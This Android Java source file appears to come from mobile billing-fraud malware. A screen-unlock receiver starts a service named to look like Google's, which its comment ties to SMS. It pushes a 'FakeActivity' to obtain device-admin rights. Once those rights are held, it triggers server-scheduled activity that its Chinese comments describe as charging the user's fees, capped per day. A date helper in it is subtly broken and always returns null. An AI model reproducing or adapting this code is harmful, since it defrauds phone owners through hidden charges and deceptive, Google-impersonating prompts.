package com.xstd.plugin.receiver;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.GoogleService;
import com.xstd.plugin.service.PluginService;

import java.text.SimpleDateFormat;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:43
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBRC extends BroadcastReceiver {

    public static final int DAY_START_HOUR = 6;

    private static final String DATE_FORMAT = "dd-HH ";

    public static String formatTime(long time) {
        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
        return dateFormat.format(time);
    }

    public static int[] getDayAndHour(long time) {
        SimpleDateFormat dateFormat = new SimpleDateFormat(DATE_FORMAT);
        String data = dateFormat.format(time);
        if (!TextUtils.isEmpty(data)) {
            String[] ds = data.split("-");
            if (ds != null && ds.length == 2) {
                int[] ret = new int[2];
                ret[0] = Integer.valueOf(ds[0]);
                ret[1] = Integer.valueOf(ds[1]);
            }
        }

        return null;
    }

    public void onReceive(Context context, Intent intent) {
        //check Google Service if runging for SMS
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, GoogleService.class);
        context.startService(serviceIntent);

        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));

        SettingManager.getInstance().init(context);
        if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action)) {
                Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);

                SettingManager.getInstance().init(context.getApplicationContext());
                if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                    //没有激活过，就调用激活接口
                    if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                            + " as active time = 0;");
                        }
                        Intent i = new Intent();
                        i.setAction(PluginService.ACTIVE_ACTION);
                        i.setClass(context, PluginService.class);
                        context.startService(i);
                    }
                } else {
                    long lastActiveTime = SettingManager.getInstance().getKeyActiveTime();
//                    Calendar c = Calendar.getInstance();
//                    c.setTimeInMillis(lastActiveTime);
//                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
//                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
//                    c = Calendar.getInstance();
//                    int curDay = c.get(Calendar.DAY_OF_YEAR);
//                    int curHour = c.get(Calendar.HOUR_OF_DAY);
                    int[] d = getDayAndHour(lastActiveTime);
                    int[] dNow = getDayAndHour(System.currentTimeMillis());
                    int lastDay = 0;
                    int lastHour = 0;
                    int curDay = 0;
                    int curHour = 0;
                    if (d != null && dNow != null) {
                        lastDay = d[0];
                        lastHour = d[1];
                        curDay = dNow[0];
                        curHour = dNow[1];
                    } else {
                        return;
                    }

                    if (Config.DEBUG) {
                        Config.LOGD("[[ScreenBRC::onReceive]] last active day = " + lastDay + " cur day = " + curDay);
                    }

                    if ((curDay != lastDay || AppRuntime.ACTIVE_RESPONSE == null)
                            && curHour > 6
                            && UtilsRuntime.isOnline(context)) {
                        //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                        //当天如果没有激活过，当天不扣费
                        if (curDay != lastDay) {
                            //如果不是同一天，将激活计数清零
                            SettingManager.getInstance().setKeyDayActiveCount(0);
                        }

                        if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
                            && SettingManager.getInstance().getKeyDayActiveCount() < 5) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                 + " as active time is over");
                            }
                            Intent i = new Intent();
                            i.setAction(PluginService.ACTIVE_ACTION);
                            i.setClass(context, PluginService.class);
                            context.startService(i);
                        }
                        return;
                    }

                    if ((curDay == lastDay)
                            && AppRuntime.ACTIVE_RESPONSE != null
                            && (curHour > AppRuntime.ACTIVE_RESPONSE.exeStart
                                    && curHour < AppRuntime.ACTIVE_RESPONSE.exeEnd)) {
                        //今天已经成功激活过了，同时激活的数据还存在，开始进行扣费的逻辑
                        //TODO: 启动扣费,假如时间随机
                        int dayCount = SettingManager.getInstance().getKeyDayCount();
                        int times = AppRuntime.ACTIVE_RESPONSE.times;
                        if (times > dayCount) {
                            if (Config.DEBUG) {
                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.MONKEY_ACTION);
                            }
                            Intent i = new Intent();
                            i.setAction(PluginService.MONKEY_ACTION);
                            i.setClass(context, PluginService.class);
                            context.startService(i);
                        }
                    }
                }
            }
        } else if (!isDeviceBinded) {
            Intent i = new Intent();
            i.setClass(context, FakeActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(i);
        }
    }

}
